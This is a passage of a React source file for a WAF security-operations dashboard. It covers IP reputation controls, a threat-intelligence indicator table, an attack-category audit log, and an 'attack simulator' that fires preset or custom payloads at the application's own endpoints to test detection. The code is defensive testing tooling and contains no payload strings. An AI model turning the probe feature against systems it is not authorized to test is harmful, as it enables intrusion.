                            className="btn-link text-rose-600 hover:text-rose-500 text-xs inline-flex items-center gap-1"
                          >
                            <Lock size={12} />
                            Block
                          </button>
                        )}

                        {rep.status !== 'ALLOWLISTED' && (
                          <button
                            onClick={() => handleAllowlistIp(rep.ip)}
                            className="btn-link text-blue-600 hover:text-blue-500 text-xs inline-flex items-center gap-1"
                          >
                            <ShieldCheck size={12} />
                            Allowlist
                          </button>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: THREAT INTELLIGENCE (TISC) */}
      {activeTab === 'threat_intel' && (
        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
            <div>
              <h2 className="text-base font-bold text-primary">External Threat Intelligence Feeds (IoCs)</h2>
              <p className="text-xs text-muted mt-0.5">
                ServiceNow Threat Intelligence Security Center (TISC) indicator repository for real-time request enrichment.
              </p>
            </div>

            <button
              onClick={() => setNewIocModal(true)}
              className="btn-primary flex items-center gap-1.5 text-xs py-2 px-3 rounded-lg font-semibold"
            >
              <Plus size={14} />
              <span>Add Indicator (IoC)</span>
            </button>
          </div>

          {loadingTi ? (
            <div className="p-8 text-center text-muted">Loading Threat Indicators...</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
                    <th className="py-2.5 px-3">Type</th>
                    <th className="py-2.5 px-3">Indicator Value</th>
                    <th className="py-2.5 px-3">Threat Actor</th>
                    <th className="py-2.5 px-3">Campaign</th>
                    <th className="py-2.5 px-3">Confidence</th>
                    <th className="py-2.5 px-3">Description</th>
                    <th className="py-2.5 px-3">Added</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border-subtle">
                  {threatIntel.map((ti) => (
                    <tr key={ti.id} className="hover:bg-bg-subtle/30 transition-colors">
                      <td className="py-3 px-3">
                        <span className="font-mono text-[10px] px-2 py-0.5 rounded bg-bg-subtle text-secondary font-bold">
                          {ti.type}
                        </span>
                      </td>
                      <td className="py-3 px-3 font-mono font-bold text-rose-600">{ti.value}</td>
                      <td className="py-3 px-3 font-medium text-primary">{ti.threat_actor || 'Unknown Group'}</td>
                      <td className="py-3 px-3 text-secondary">{ti.campaign || 'General Exploitation'}</td>
                      <td className="py-3 px-3">
                        <div className="flex items-center gap-2">
                          <div className="w-14 bg-bg-subtle rounded-full h-2 overflow-hidden">
                            <div className="h-full bg-rose-600" style={{ width: `${ti.confidence}%` }} />
                          </div>
                          <span className="font-mono text-[11px] text-muted">{ti.confidence}%</span>
                        </div>
                      </td>
                      <td className="py-3 px-3 max-w-[280px] truncate text-muted" title={ti.description}>
                        {ti.description}
                      </td>
                      <td className="py-3 px-3 text-muted">
                        {new Date(ti.added_at).toLocaleDateString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 4: WAF SECURITY HISTORY & AUDIT */}
      {activeTab === 'audit_events' && (
        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
            <div>
              <h2 className="text-base font-bold text-primary">WAF Inspection History & Audit Trail</h2>
              <p className="text-xs text-muted mt-0.5">
                Every request inspection is immutably logged with its hash-chained audit event. Zero passwords or tokens are stored.
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <input
                type="text"
                placeholder="Filter by IP..."
                value={searchEvIp}
                onChange={(e) => setSearchEvIp(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && fetchEvents()}
                className="input-text text-xs py-1.5 px-2.5 rounded-lg border border-border-subtle w-32"
              />

              <select
                value={filterEvCategory}
                onChange={(e) => setFilterEvCategory(e.target.value)}
                className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
                aria-label="Filter Category"
              >
                <option value="ALL">All Categories</option>
                <option value="SQL_INJECTION">SQL Injection</option>
                <option value="XSS">XSS</option>
                <option value="COMMAND_INJECTION">Command Injection</option>
                <option value="PATH_TRAVERSAL">Path Traversal</option>
                <option value="THREAT_INTEL_IP">Threat Intel Match</option>
              </select>

              <select
                value={filterEvAction}
                onChange={(e) => setFilterEvAction(e.target.value)}
                className="input-select text-xs py-1.5 px-2 rounded-lg border border-border-subtle"
                aria-label="Filter Action Taken"
              >
                <option value="ALL">All Actions</option>
                <option value="BLOCKED">Blocked</option>
                <option value="RATE_LIMITED">Rate Limited</option>
                <option value="FLAGGED">Flagged</option>
                <option value="ALLOWED">Allowed</option>
              </select>

              <button
                onClick={fetchEvents}
                className="btn-secondary text-xs py-1.5 px-3 rounded-lg"
              >
                <Search size={13} />
              </button>
            </div>
          </div>

          {loadingEvents ? (
            <div className="p-8 text-center text-muted">Loading Security History...</div>
          ) : events.length === 0 ? (
            <div className="p-8 text-center text-muted">No security events found.</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
                    <th className="py-2.5 px-3">Time</th>
                    <th className="py-2.5 px-3">IP Address</th>
                    <th className="py-2.5 px-3">Method & Path</th>
                    <th className="py-2.5 px-3">Attack Category</th>
                    <th className="py-2.5 px-3">Risk</th>
                    <th className="py-2.5 px-3">Severity</th>
                    <th className="py-2.5 px-3">Action</th>
                    <th className="py-2.5 px-3">Incident</th>
                    <th className="py-2.5 px-3 text-right">Payload</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border-subtle">
                  {events.map((ev) => (
                    <tr key={ev.id} className="hover:bg-bg-subtle/30 transition-colors">
                      <td className="py-3 px-3 text-muted">
                        {new Date(ev.timestamp).toLocaleTimeString()}
                      </td>
                      <td className="py-3 px-3 font-mono font-medium text-primary">{ev.source_ip}</td>
                      <td className="py-3 px-3 font-mono text-secondary">
                        <span className="font-bold text-accent-crimson mr-1.5">{ev.method}</span>
                        {ev.path}
                      </td>
                      <td className="py-3 px-3">
                        <span className="font-mono text-[10px] font-semibold text-rose-700 bg-rose-50 dark:bg-rose-950/40 px-2 py-0.5 rounded border border-rose-200 dark:border-rose-900">
                          {ev.category}
                        </span>
                      </td>
                      <td className="py-3 px-3 font-mono font-bold text-primary">{ev.risk_score}</td>
                      <td className="py-3 px-3">{getSeverityBadge(ev.severity)}</td>
                      <td className="py-3 px-3">
                        <span
                          className={`font-semibold text-[10px] px-2 py-0.5 rounded ${
                            ev.action_taken === 'BLOCKED'
                              ? 'bg-rose-950 text-rose-300 border border-rose-600'
                              : ev.action_taken === 'RATE_LIMITED'
                              ? 'bg-amber-950 text-amber-300 border border-amber-600'
                              : ev.action_taken === 'FLAGGED'
                              ? 'bg-amber-900/40 text-amber-400'
                              : 'bg-emerald-900/30 text-emerald-300'
                          }`}
                        >
                          {ev.action_taken}
                        </span>
                      </td>
                      <td className="py-3 px-3 font-mono text-accent-crimson">
                        {ev.incident_id || '—'}
                      </td>
                      <td className="py-3 px-3 text-right">
                        <button
                          onClick={() => setSelectedEvent(ev)}
                          className="btn-link text-xs flex items-center gap-1 justify-end"
                        >
                          <Eye size={12} /> Inspect
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 5: LIVE ATTACK SIMULATOR & WAF TESTBED */}
      {activeTab === 'simulator' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Simulator Controls & Presets */}
          <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
            <h2 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
              <Zap size={18} className="text-amber-500" />
              <span>Interactive Attack Probe & WAF Tester</span>
            </h2>
            <p className="text-xs text-muted mb-4">
              Simulate malicious payloads against GrantGate endpoints to verify real-time inspection, risk scoring, ServiceNow SIR incident auto-creation, and IP restriction.
            </p>

            {/* Quick Presets */}
            <div className="mb-5">
              <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-2">
                Pre-Configured Attack Vectors
              </label>
              <div className="grid grid-cols-1 gap-2">
                {attackPresets.map((p) => (
                  <button
                    key={p.name}
                    onClick={() => handleRunSimulation(p)}
                    className="flex items-center justify-between p-2.5 rounded-lg border border-border-subtle bg-bg-subtle/50 hover:bg-bg-subtle hover:border-accent-crimson/40 text-left transition-all group"
                  >
                    <div>
                      <div className="text-xs font-bold text-primary group-hover:text-accent-crimson">
                        {p.name}
                      </div>
                      <div className="text-[11px] font-mono text-muted mt-0.5">
                        {p.method} {p.path} &bull; IP: {p.ip}
                      </div>
                    </div>
                    <span className="text-xs font-semibold text-accent-crimson opacity-0 group-hover:opacity-100 transition-opacity">
                      Fire &rarr;
                    </span>
                  </button>
                ))}
              </div>
            </div>

            {/* Custom Probe Form */}
            <div className="border-t border-border-subtle pt-4">
              <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-3">
                Custom Probe Parameters
              </label>

              <div className="grid grid-cols-2 gap-3 mb-3">
                <div>
                  <label className="text-xs text-muted block mb-1">Source IP Address</label>
                  <input
                    type="text"
                    value={simIp}
                    onChange={(e) => setSimIp(e.target.value)}
                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted block mb-1">HTTP Method</label>
                  <select
                    value={simMethod}
                    onChange={(e) => setSimMethod(e.target.value)}
                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
                  >
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                    <option value="PUT">PUT</option>
                    <option value="DELETE">DELETE</option>
                  </select>
                </div>
              </div>

              <div className="mb-3">
                <label className="text-xs text-muted block mb-1">Target Endpoint Path</label>
                <input
                  type="text"
                  value={simPath}
                  onChange={(e) => setSimPath(e.target.value)}
                  className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
                />
              </div>

              <div className="mb-4">
                <label className="text-xs text-muted block mb-1">Request Body / Payload Content</label>
                <textarea
                  rows={3}
                  value={simPayload}
                  onChange={(e) => setSimPayload(e.target.value)}
                  className="input-text text-xs w-full p-2.5 rounded-lg border border-border-subtle font-mono"
                  placeholder="Enter raw payload string to test..."
                />
              </div>

              <button
                onClick={() => handleRunSimulation()}
                disabled={simulating}
                className="btn-danger w-full py-2.5 px-4 text-xs font-bold rounded-lg flex items-center justify-center gap-2"
              >
                <Flame size={15} />
                <span>{simulating ? 'Evaluating at Gateway...' : 'Launch WAF Inspection Probe'}</span>
              </button>
            </div>
          </div>

          {/* Simulator Live Verdict Panel */}
          <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
            <h2 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
              <ShieldCheck size={18} className="text-emerald-500" />
              <span>Real-Time WAF Gateway Verdict</span>
            </h2>
            <p className="text-xs text-muted mb-4">
              Inspection output returned by the SecOps detection engine and policy pipeline.
            </p>

            {simulating ? (
              <div className="p-12 text-center text-muted space-y-3">
                <RefreshCw size={28} className="mx-auto animate-spin text-accent-crimson" />
                <p className="text-xs">Scanning signatures, cross-referencing threat intel & calculating risk score...</p>
              </div>
            ) : !simResult ? (
              <div className="p-12 text-center text-muted border border-dashed border-border-subtle rounded-xl">
                <Activity size={36} className="mx-auto mb-2 opacity-40" />
                <p className="text-xs">Select an attack vector or launch a custom probe to observe the defense response.</p>
              </div>
            ) : (
              <div className="space-y-4">
                {/* Decision Banner */}
                <div
                  className={`p-4 rounded-xl border flex items-center justify-between ${
                    simResult.action_taken === 'BLOCKED'
                      ? 'bg-rose-950/40 border-rose-600/50 text-rose-200'
                      : simResult.action_taken === 'FLAGGED'
                      ? 'bg-amber-950/40 border-amber-600/50 text-amber-200'
                      : 'bg-emerald-950/40 border-emerald-600/50 text-emerald-200'
                  }`}
                >
                  <div>
                    <div className="text-[10px] uppercase font-bold tracking-wider opacity-80">WAF Decision</div>
                    <div className="text-lg font-bold flex items-center gap-2 mt-0.5">
                      {simResult.action_taken === 'BLOCKED' ? <XCircle size={18} /> : <CheckCircle2 size={18} />}
                      <span>{simResult.action_taken}</span>
                    </div>
                  </div>

                  <div className="text-right">
                    <div className="text-[10px] uppercase font-bold tracking-wider opacity-80">Calculated Risk Score</div>
                    <div className="text-2xl font-mono font-bold">{simResult.risk_score} / 100</div>
                  </div>
                </div>

                {/* Details Breakdown */}
                <div className="p-3 bg-bg-subtle/50 rounded-xl border border-border-subtle text-xs space-y-2.5">
                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
                    <span className="text-muted">Detected Threat Category:</span>
                    <span className="font-mono font-bold text-accent-crimson">{simResult.category}</span>
                  </div>

                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
                    <span className="text-muted">Signature Pattern Matched:</span>
                    <span className="font-mono text-secondary max-w-[240px] truncate" title={simResult.pattern_matched}>
                      {simResult.pattern_matched || 'None'}
                    </span>
                  </div>

                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
                    <span className="text-muted">Assigned Severity:</span>
                    <span>{getSeverityBadge(simResult.severity)}</span>
                  </div>

                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
                    <span className="text-muted">Cumulative Offense Count:</span>
                    <span className="font-mono font-bold text-rose-600">{simResult.repeat_count}</span>
                  </div>

                  <div className="flex justify-between items-center py-1 border-b border-border-subtle">
                    <span className="text-muted">Updated IP Restriction State:</span>
                    <span>{getIpStatusBadge(simResult.ip_status)}</span>
                  </div>

                  <div className="flex justify-between items-center py-1">
                    <span className="text-muted">ServiceNow Incident Number:</span>
                    {simResult.incident_id ? (
                      <span className="font-mono font-bold text-accent-crimson bg-accent-crimson-light/40 px-2 py-0.5 rounded border border-accent-crimson/30">
                        {simResult.incident_id}
                      </span>
                    ) : (
                      <span className="text-muted italic">None (Below P1 Threshold)</span>
                    )}
                  </div>
                </div>

                {/* Sanitized Payload Preview */}
                <div>
                  <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-1.5">
                    Sanitized Payload (Cross-Site Scripting neutralized):
                  </label>
                  <pre className="p-2.5 bg-bg-subtle rounded-lg text-xs font-mono text-secondary overflow-x-auto border border-border-subtle">
                    {simResult.sanitized_content || 'None'}
                  </pre>
                </div>

                {simResult.incident_id && (
                  <button
                    onClick={() => {
                      setActiveTab('incidents');
                      fetchIncidentDetails(simResult.incident_id);
                    }}
                    className="btn-secondary w-full py-2 px-3 text-xs flex items-center justify-center gap-1.5"
                  >
                    <span>View Generated ServiceNow Incident</span>
                    <ChevronRight size={14} />
                  </button>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* MODAL: MANUAL BLOCK IP */}
      {blockIpModal.open && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="card p-6 rounded-2xl max-w-md w-full bg-card border border-border-subtle shadow-xl">
            <h3 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
              <Lock size={18} className="text-rose-500" />
              <span>Block IP at WAF Layer</span>
            </h3>
            <p className="text-xs text-muted mb-4">
              Blocks incoming traffic from this IP address at the API Gateway middleware before reaching application endpoints.
            </p>

            <div className="space-y-3 mb-5">
              <div>
                <label className="text-xs text-muted block mb-1">Target IP Address</label>
                <input
                  type="text"
                  value={blockIpModal.ip}
                  onChange={(e) => setBlockIpModal({ ...blockIpModal, ip: e.target.value })}
                  placeholder="e.g. 198.51.100.42"
                  className="input-text text-xs w-full py-2 px-3 rounded-lg border border-border-subtle font-mono"
                />
              </div>

              <div>
                <label className="text-xs text-muted block mb-1">Block Duration</label>
                <div className="flex gap-4 text-xs">
                  <label className="flex items-center gap-1.5 cursor-pointer">
                    <input
                      type="radio"
                      checked={!blockIpModal.isPerm}
                      onChange={() => setBlockIpModal({ ...blockIpModal, isPerm: false })}
                    />
                    <span>Temporary (1 Hour)</span>
                  </label>
                  <label className="flex items-center gap-1.5 cursor-pointer">
                    <input
                      type="radio"
                      checked={blockIpModal.isPerm}
                      onChange={() => setBlockIpModal({ ...blockIpModal, isPerm: true })}
                    />
                    <span>Permanent (Admin Approval)</span>
                  </label>
                </div>
              </div>

              <div>
                <label className="text-xs text-muted block mb-1">Justification Reason</label>
                <textarea
                  rows={2}
                  value={blockReason}
                  onChange={(e) => setBlockReason(e.target.value)}
                  className="input-text text-xs w-full p-2 rounded-lg border border-border-subtle"
                />
              </div>
            </div>

            <div className="flex justify-end gap-2">
              <button
                onClick={() => setBlockIpModal({ open: false, ip: '', isPerm: false })}
                className="btn-secondary text-xs py-2 px-4 rounded-lg"
              >
                Cancel
              </button>
              <button
                onClick={handleBlockIp}
                disabled={!blockIpModal.ip.trim()}
                className="btn-danger text-xs py-2 px-4 rounded-lg font-semibold"
              >
                Confirm WAF Block
              </button>
            </div>
          </div>
        </div>
      )}

      {/* MODAL: ADD THREAT INTEL INDICATOR (IoC) */}
      {newIocModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <form onSubmit={handleCreateIoc} className="card p-6 rounded-2xl max-w-md w-full bg-card border border-border-subtle shadow-xl">
            <h3 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
              <Radio size={18} className="text-purple-500" />
              <span>Ingest Threat Intelligence Indicator</span>
            </h3>
            <p className="text-xs text-muted mb-4">
              Add external Indicator of Compromise (IoC) to enrich real-time request threat evaluation.
            </p>

            <div className="space-y-3 mb-5">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-xs text-muted block mb-1">Indicator Type</label>
                  <select
                    value={newIocType}
                    onChange={(e) => setNewIocType(e.target.value)}
                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
                  >
                    <option value="IP">IP Address</option>
                    <option value="DOMAIN">Domain</option>
                    <option value="URL">URL</option>
                    <option value="HASH">File Hash</option>
                  </select>
                </div>
                <div>
                  <label className="text-xs text-muted block mb-1">Confidence ({newIocConfidence}%)</label>
                  <input
                    type="range"
                    min="1"
                    max="100"
                    value={newIocConfidence}
                    onChange={(e) => setNewIocConfidence(Number(e.target.value))}
                    className="w-full mt-2"
                  />
                </div>
              </div>

              <div>
                <label className="text-xs text-muted block mb-1">Indicator Value</label>
                <input
                  type="text"
                  required
                  placeholder="e.g. 198.51.100.42 or evil-exfil.xyz"
                  value={newIocValue}
                  onChange={(e) => setNewIocValue(e.target.value)}
                  className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-xs text-muted block mb-1">Threat Actor (Optional)</label>
                  <input
                    type="text"
                    placeholder="e.g. APT29 / Cozy Bear"
                    value={newIocActor}
                    onChange={(e) => setNewIocActor(e.target.value)}
                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted block mb-1">Campaign (Optional)</label>
                  <input
                    type="text"
                    placeholder="e.g. Operation PhishStorm"
                    value={newIocCampaign}
                    onChange={(e) => setNewIocCampaign(e.target.value)}
                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
                  />
                </div>
              </div>

              <div>
                <label className="text-xs text-muted block mb-1">Description & Context</label>
                <textarea
                  required
                  rows={2}
                  placeholder="Provide context regarding this threat indicator..."
                  value={newIocDesc}
                  onChange={(e) => setNewIocDesc(e.target.value)}
                  className="input-text text-xs w-full p-2 rounded-lg border border-border-subtle"
                />
              </div>
            </div>

            <div className="flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setNewIocModal(false)}
                className="btn-secondary text-xs py-2 px-4 rounded-lg"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="btn-primary text-xs py-2 px-4 rounded-lg font-semibold"
              >
                Add Indicator
              </button>
            </div>
          </form>
        </div>
      )}

      {/* MODAL: EVENT PAYLOAD INSPECTION */}
      {selectedEvent && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="card p-6 rounded-2xl max-w-lg w-full bg-card border border-border-subtle shadow-xl">
            <div className="flex items-center justify-between pb-3 border-b border-border-subtle mb-4">
              <div>
                <span className="text-xs font-mono text-accent-crimson font-bold block">{selectedEvent.id}</span>
                <h3 className="text-sm font-bold text-primary mt-0.5">WAF Payload Inspection</h3>
              </div>
              <button onClick={() => setSelectedEvent(null)} className="text-muted hover:text-primary text-sm font-bold">
                ✕
              </button>
            </div>

            <div className="space-y-3 text-xs mb-5">
              <div className="flex justify-between py-1 border-b border-border-subtle">
                <span className="text-muted">Source IP:</span>
                <span className="font-mono font-bold text-primary">{selectedEvent.source_ip}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-border-subtle">
                <span className="text-muted">Endpoint:</span>
                <span className="font-mono text-secondary">{selectedEvent.method} {selectedEvent.path}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-border-subtle">
                <span className="text-muted">Attack Category:</span>
                <span className="font-mono text-accent-crimson font-semibold">{selectedEvent.category}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-border-subtle">
                <span className="text-muted">Signature Pattern:</span>
                <span className="font-mono text-secondary">{selectedEvent.pattern_matched || 'None'}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-border-subtle">
                <span className="text-muted">Risk Score:</span>
                <span className="font-mono font-bold text-rose-600">{selectedEvent.risk_score} / 100</span>
              </div>

              <div>
                <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-1">
                  Recorded Sanitized Payload Snippet:
                </label>
                <pre className="p-3 bg-bg-subtle rounded-lg font-mono text-xs text-secondary overflow-x-auto border border-border-subtle max-h-40">
                  {selectedEvent.payload_snippet || '(Empty payload)'}
                </pre>
                <span className="text-[11px] text-muted block mt-1">
                  Note: Sensitive secrets, auth tokens, and emails are strictly masked before persistence.
                </span>
              </div>
            </div>

            <div className="flex justify-end">
              <button
                onClick={() => setSelectedEvent(null)}
                className="btn-secondary text-xs py-2 px-4 rounded-lg"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
export default SecOpsPage;
